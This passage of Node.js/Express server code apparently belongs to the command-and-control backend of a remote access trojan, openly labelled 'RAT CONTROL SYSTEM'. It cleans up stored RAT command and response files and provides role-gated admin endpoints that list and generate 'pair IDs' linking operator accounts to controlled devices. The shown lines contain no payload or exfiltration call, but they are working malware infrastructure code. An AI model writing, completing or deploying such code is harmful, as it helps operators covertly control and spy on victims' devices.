      if (f === 'rat_commands')  data = data.filter(d => now - (d.ts||0) < 60000);
      if (f === 'rat_responses') data = data.filter(d => now - (d.ts||0) < 120000);
      saveRat(`./${f}.json`, data);
    } catch(_) {}
  }, 3600000);
});

// ── Admin RAT endpoints ──────────────────────────────────────────────────────
app.get('/admin/listpairids', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  res.json({ valid: true, users: db.map(u => ({ username: u.username, pairId: u.pairId||null })) });
});

app.get('/admin/genpairid', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  db[idx].pairId = genPairId();
  fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
  res.json({ valid: true, pairId: db[idx].pairId });
});

// ════════════════════════════════════════════════════════════════════════════
// ██████████  END RAT CONTROL SYSTEM  ████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════